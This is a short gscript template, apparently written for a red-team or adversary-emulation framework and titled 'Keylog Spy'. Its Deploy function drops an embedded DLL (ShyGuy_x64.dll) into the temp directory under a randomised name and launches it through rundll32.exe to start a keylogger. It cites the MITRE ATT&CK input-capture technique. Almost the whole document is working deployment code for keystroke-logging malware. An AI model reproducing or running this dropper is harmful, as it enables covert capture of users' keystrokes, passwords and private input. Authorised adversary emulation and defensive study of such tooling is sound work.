// Example gscript template
// Title: Keylog Spy
// Author: ahhh
// Purpose: keylogger!
// Gscript version: 1.0.0
// ATT&CK: https://attack.mitre.org/wiki/Technique/T1056
// Using ShyGuy: 

//priority:150
//timeout:150
//import:/private/tmp/ShyGuy_x64.dll
//go_import:os as os

function Deploy() {  
    console.log("Starting Keylog");

    // Prep the sample
    var spy = GetAssetAsBytes("ShyGuy_x64.dll");
    // Getting a temp file path
    var temppath = os.TempDir();
    var naming = G.rand.GetAlphaString(4);
    naming = naming.toLowerCase();
    var fullpath = temppath+naming+".dll";

    // Write the sample
    console.log("file name: "+ fullpath);
    errors = G.file.WriteFileFromBytes(fullpath, spy[0]);
    console.log("errors: "+errors);

    var cmd = fullpath + ",dllmain";
    var running = G.exec.ExecuteCommandAsync("C:\\Windows\\System32\\rundll32.exe", [cmd]);
    console.log("errors: "+running[1]);

    console.log("Done Keylog");
    return true;
  }
  